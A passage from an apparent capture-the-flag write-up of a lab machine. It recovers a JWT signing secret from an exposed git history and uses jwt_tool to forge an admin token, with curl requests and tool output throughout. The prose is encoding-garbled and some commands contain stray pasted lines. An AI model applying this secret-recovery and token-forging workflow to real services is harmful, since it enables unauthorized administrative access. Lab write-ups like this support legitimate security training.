</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>- Nikto v2.1.6
</span></span><span style=display:flex><span>---------------------------------------------------------------------------
</span></span><span style=display:flex><span>+ Target IP:          10.10.11.120
</span></span><span style=display:flex><span>+ Target Hostname:    10.10.11.120
</span></span><span style=display:flex><span>+ Target Port:        <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>+ Start Time:         2022-02-18 01:25:46 <span style=color:#f92672>(</span>GMT-5<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>---------------------------------------------------------------------------
</span></span><span style=display:flex><span>+ Server: nginx/1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>+ Retrieved x-powered-by header: Express
</span></span><span style=display:flex><span>+ The anti-clickjacking X-Frame-Options header is not present.
</span></span><span style=display:flex><span>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span></span><span style=display:flex><span>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span></span><span style=display:flex><span>+ No CGI Directories found <span style=color:#f92672>(</span>use <span style=color:#e6db74>&#39;-C all&#39;</span> to force check all possible dirs<span style=color:#f92672>)</span>
</span></span></code></pre></div><h3 id=3-source-code>3. Source Code<a hidden class=anchor aria-hidden=true href=#3-source-code>#</a></h3><p>Download —Ö—ç—Å—ç–≥—Ç files.zip:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>total <span style=color:#ae81ff>84</span>
</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi   <span style=color:#ae81ff>182</span> Sep  <span style=color:#ae81ff>3</span> 01:57 .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi    <span style=color:#ae81ff>36</span> Feb <span style=color:#ae81ff>18</span> 01:29 ..
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> ca4mi ca4mi    <span style=color:#ae81ff>72</span> Sep  <span style=color:#ae81ff>3</span> 01:59 .env
</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi   <span style=color:#ae81ff>144</span> Sep  <span style=color:#ae81ff>8</span> 14:33 .git
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> ca4mi ca4mi   <span style=color:#ae81ff>885</span> Sep  <span style=color:#ae81ff>3</span> 01:56 index.js
</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi    <span style=color:#ae81ff>14</span> Aug <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2021</span> model
</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi  <span style=color:#ae81ff>4158</span> Aug <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2021</span> node_modules
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> ca4mi ca4mi   <span style=color:#ae81ff>491</span> Aug <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2021</span> package.json
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> ca4mi ca4mi <span style=color:#ae81ff>69452</span> Aug <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2021</span> package-lock.json
</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi    <span style=color:#ae81ff>20</span> Sep  <span style=color:#ae81ff>3</span> 01:54 public
</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi    <span style=color:#ae81ff>80</span> Sep  <span style=color:#ae81ff>3</span> 02:32 routes
</span></span><span style=display:flex><span>drwxrwxr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi    <span style=color:#ae81ff>22</span> Aug <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2021</span> src
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> ca4mi ca4mi   <span style=color:#ae81ff>651</span> Aug <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2021</span> validations.js
</span></span></code></pre></div><p><code>.env</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>DB_CONNECT <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
</span></span><span style=display:flex><span>TOKEN_SECRET <span style=color:#f92672>=</span> secret
</span></span></code></pre></div><p>Gittools <code>.git</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mkdir dump
</span></span><span style=display:flex><span>bash /opt/tools/Extractor/extractor.sh local-web/ dump
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -X POST -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> -v http://secret.htb/api/user/register --data <span style=color:#e6db74>&#39;{&#34;foo&#34;: &#34;bar&#34;}&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Note: Unnecessary use of -X or --request, POST is already inferred.
</span></span><span style=display:flex><span>*   Trying 10.10.11.120:80...
</span></span><span style=display:flex><span>* Connected to secret.htb <span style=color:#f92672>(</span>10.10.11.120<span style=color:#f92672>)</span> port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
</span></span><span style=display:flex><span>&gt; POST /api/user/register HTTP/1.1
</span></span><span style=display:flex><span>&gt; Host: secret.htb
</span></span><span style=display:flex><span>&gt; User-Agent: curl/7.74.0
</span></span><span style=display:flex><span>&gt; Accept: */*
</span></span><span style=display:flex><span>&gt; Content-Type: application/json
</span></span><span style=display:flex><span>&gt; Content-Length: <span style=color:#ae81ff>14</span>
</span></span><span style=display:flex><span>&gt; 
</span></span><span style=display:flex><span>* upload completely sent off: <span style=color:#ae81ff>14</span> out of <span style=color:#ae81ff>14</span> bytes
</span></span><span style=display:flex><span>* Mark bundle as not supporting multiuse
</span></span><span style=display:flex><span>&lt; HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
</span></span><span style=display:flex><span>&lt; Server: nginx/1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>&lt; Date: Fri, <span style=color:#ae81ff>18</span> Feb <span style=color:#ae81ff>2022</span> 07:54:16 GMT
</span></span><span style=display:flex><span>&lt; Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
</span></span><span style=display:flex><span>&lt; Content-Length: <span style=color:#ae81ff>18</span>
</span></span><span style=display:flex><span>&lt; Connection: keep-alive
</span></span><span style=display:flex><span>&lt; X-Powered-By: Express
</span></span><span style=display:flex><span>&lt; ETag: W/<span style=color:#e6db74>&#34;12-FCVaNPnXYf0hIGYsTUTYByRq5/U&#34;</span>
</span></span><span style=display:flex><span>&lt; 
</span></span><span style=display:flex><span>* Connection <span style=color:#75715e>#0 to host secret.htb left intact</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;name&#34;</span> is required
</span></span></code></pre></div><p><code>"name" is required</code> OK</p><p><code>validation.js</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>Joi</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;@hapi/joi&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// register validation 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>registerValidation</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span> =&gt;{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>schema</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Joi</span>.<span style=color:#a6e22e>string</span>().<span style=color:#a6e22e>min</span>(<span style=color:#ae81ff>6</span>).<span style=color:#a6e22e>required</span>(),
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>email</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Joi</span>.<span style=color:#a6e22e>string</span>().<span style=color:#a6e22e>min</span>(<span style=color:#ae81ff>6</span>).<span style=color:#a6e22e>required</span>().<span style=color:#a6e22e>email</span>(),
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Joi</span>.<span style=color:#a6e22e>string</span>().<span style=color:#a6e22e>min</span>(<span style=color:#ae81ff>6</span>).<span style=color:#a6e22e>required</span>()
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>Joi</span>.<span style=color:#a6e22e>validate</span>(<span style=color:#a6e22e>data</span>, <span style=color:#a6e22e>schema</span>)
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// login validation
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>loginValidation</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span> =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>schema2</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>email</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Joi</span>.<span style=color:#a6e22e>string</span>().<span style=color:#a6e22e>min</span>(<span style=color:#ae81ff>6</span>).<span style=color:#a6e22e>required</span>().<span style=color:#a6e22e>email</span>(),
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Joi</span>.<span style=color:#a6e22e>string</span>().<span style=color:#a6e22e>min</span>(<span style=color:#ae81ff>6</span>).<span style=color:#a6e22e>required</span>()
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>Joi</span>.<span style=color:#a6e22e>validate</span>(<span style=color:#a6e22e>data</span>, <span style=color:#a6e22e>schema2</span>)
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>module</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>registerValidation</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>registerValidation</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>module</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>loginValidation</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>loginValidation</span>
</span></span></code></pre></div><p><code>auth.js</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>// create jwt 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>sign</span>({ <span style=color:#a6e22e>_id</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>id</span>, <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>name</span> , <span style=color:#a6e22e>email</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>email</span>}, <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>TOKEN_SECRET</span> )
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;auth-token&#39;</span>, <span style=color:#a6e22e>token</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>token</span>);
</span></span></code></pre></div><p><code>TOKEN_SECRET</code>?</p><p><code>.env</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>DB_CONNECT <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
</span></span><span style=display:flex><span>TOKEN_SECRET <span style=color:#f92672>=</span> secret
</span></span></code></pre></div><p><code>dump</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi <span style=color:#ae81ff>204</span> Feb <span style=color:#ae81ff>18</span> 02:50 0-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi <span style=color:#ae81ff>220</span> Feb <span style=color:#ae81ff>18</span> 02:51 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi <span style=color:#ae81ff>204</span> Feb <span style=color:#ae81ff>18</span> 02:53 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi <span style=color:#ae81ff>204</span> Feb <span style=color:#ae81ff>18</span> 02:54 3-de0a46b5107a2f4d26e348303e76d85ae4870934
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi <span style=color:#ae81ff>220</span> Feb <span style=color:#ae81ff>18</span> 02:56 4-3a367e735ee76569664bf7754eaaade7c735d702
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> ca4mi ca4mi <span style=color:#ae81ff>204</span> Feb <span style=color:#ae81ff>18</span> 02:57 5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
</span></span></code></pre></div><p><code>/dump/1-55fe756a29268f9b4e786ae468952ca4a8df1bd8</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>DB_CONNECT <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
</span></span><span style=display:flex><span>TOKEN_SECRET <span style=color:#f92672>=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
</span></span></code></pre></div><p><code>verifytoken.js</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>jwt</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;jsonwebtoken&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>module</span>.<span style=color:#a6e22e>exports</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>, <span style=color:#a6e22e>next</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;auth-token&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>token</span>) <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Access Denied&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>TOKEN_SECRET</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>verified</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>next</span>();
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Invalid Token&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><h3 id=4-register-user>4. Register User<a hidden class=anchor aria-hidden=true href=#4-register-user>#</a></h3><p>Create User:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -X POST -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> -v http://secret.htb/api/user/register --data <span style=color:#e6db74>&#39;{&#34;name&#34;: &#34;ttttyly&#34;,&#34;email&#34;:&#34;ttttyly@ttttyly.com&#34;,&#34;password&#34;:&#34;ttttyly&#34;}&#39;</span>
</span></span></code></pre></div><p>Login:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -X POST -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> -v http://secret.htb/api/user/login --data <span style=color:#e6db74>&#39;{&#34;email&#34;:&#34;ttttyly@ttttyly.com&#34;,&#34;password&#34;:&#34;ttttyly&#34;}&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Note: Unnecessary use of -X or --request, POST is already inferred.
</span></span><span style=display:flex><span>*   Trying 10.10.11.120:80...
</span></span><span style=display:flex><span>* Connected to secret.htb <span style=color:#f92672>(</span>10.10.11.120<span style=color:#f92672>)</span> port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
</span></span><span style=display:flex><span>&gt; POST /api/user/login HTTP/1.1
</span></span><span style=display:flex><span>&gt; Host: secret.htb
</span></span><span style=display:flex><span>&gt; User-Agent: curl/7.74.0
</span></span><span style=display:flex><span>&gt; Accept: */*
</span></span><span style=display:flex><span>&gt; Content-Type: application/json
</span></span><span style=display:flex><span>&gt; Content-Length: <span style=color:#ae81ff>52</span>
</span></span><span style=display:flex><span>&gt; 
</span></span><span style=display:flex><span>* upload completely sent off: <span style=color:#ae81ff>52</span> out of <span style=color:#ae81ff>52</span> bytes
</span></span><span style=display:flex><span>* Mark bundle as not supporting multiuse
</span></span><span style=display:flex><span>&lt; HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>&lt; Server: nginx/1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>&lt; Date: Sun, <span style=color:#ae81ff>20</span> Feb <span style=color:#ae81ff>2022</span> 05:02:35 GMT
</span></span><span style=display:flex><span>&lt; Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
</span></span><span style=display:flex><span>&lt; Content-Length: <span style=color:#ae81ff>212</span>
</span></span><span style=display:flex><span>&lt; Connection: keep-alive
</span></span><span style=display:flex><span>&lt; X-Powered-By: Express
</span></span><span style=display:flex><span>&lt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64
</span></span><span style=display:flex><span>&lt; ETag: W/<span style=color:#e6db74>&#34;d4-oM8BhVITzPnt1fTP3GjDWP1r3pE&#34;</span>
</span></span><span style=display:flex><span>&lt; 
</span></span><span style=display:flex><span>* Connection <span style=color:#75715e>#0 to host secret.htb left intact</span>
</span></span><span style=display:flex><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64
</span></span></code></pre></div><p>–ù—ç–≤—Ç—Ä—ç–Ω –æ—Ä—Å–æ–Ω</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://secret.htb/api/priv -H <span style=color:#e6db74>&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt; ETag: W/&#34;d4-oM8BhVITzPnt1fTP3GjDWP1r3pE&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;role&#34;</span>:<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;role&#34;</span>:<span style=color:#e6db74>&#34;you are normal user&#34;</span>,<span style=color:#e6db74>&#34;desc&#34;</span>:<span style=color:#e6db74>&#34;ttttyly&#34;</span><span style=color:#f92672>}}</span>
</span></span></code></pre></div><p>JWT Token —Ö”©—Ä–≤“Ø“Ø–ª—ç—Ö:
<a href=https://github.com/ticarpi/jwt_tool>https://github.com/ticarpi/jwt_tool</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tar xvzf jwt_tool-2.2.5.tar.gz
</span></span><span style=display:flex><span>python3 -m pip install termcolor cprint pycryptodomex requests
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64
</span></span><span style=display:flex><span>&lt; ETag: W/<span style=color:#e6db74>&#34;d4-oM8BhVITzPnt1fTP3GjDWP1r3pE
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>=====================</span>
</span></span><span style=display:flex><span>Decoded Token Values:
</span></span><span style=display:flex><span><span style=color:#f92672>=====================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Token header values:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> alg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;HS256&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> typ <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;JWT&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Token payload values:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> _id <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;6211cb53b289b4045a91baa4&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ttttyly&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> email <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ttttyly@ttttyly.com&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> iat <span style=color:#f92672>=</span> 1645333355    <span style=color:#f92672>==</span>&gt; TIMESTAMP <span style=color:#f92672>=</span> 2022-02-20 00:02:35 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>----------------------
</span></span><span style=display:flex><span>JWT common timestamps:
</span></span><span style=display:flex><span>iat <span style=color:#f92672>=</span> IssuedAt
</span></span><span style=display:flex><span>exp <span style=color:#f92672>=</span> Expires
</span></span><span style=display:flex><span>nbf <span style=color:#f92672>=</span> NotBefore
</span></span><span style=display:flex><span>----------------------
</span></span></code></pre></div><p>Source -—Å –æ–ª–¥—Å–æ–Ω key –Ω—ç–º—ç—Ö:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 jwt_tool.py -I -S hs256 -pc <span style=color:#e6db74>&#39;name&#39;</span> -pv <span style=color:#e6db74>&#39;theadmin&#39;</span> -p <span style=color:#e6db74>&#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#39;</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidHR0dHlseSIsImVtYWlsIjoidHR0dHlseUB0dHR0eWx5LmNvbSIsImlhdCI6MTY0NTMzMzM1NX0.rjAh8i130oVnFzC6pG1i1ik0yLrUIaecTygnXdH6M64
</span></span><span style=display:flex><span>&lt; ETag: W/<span style=color:#e6db74>&#34;d4-oM8BhVITzPnt1fTP3GjDWP1r3pE
</span></span></span></code></pre></div><p>–ù—ç–º—Å—ç–Ω token:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Original JWT: 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>jwttool_cbf8204ec14c30927f8819921cb0c4ec - Tampered token - HMAC Signing:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjExY2I1M2IyODliNDA0NWE5MWJhYTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InR0dHR5bHlAdHR0dHlseS5jb20iLCJpYXQiOjE2NDUzMzMzNTV9.2SH9m9C4nSVNM27fKSAoPtCAqhtMEqajjzkMkt0W79M
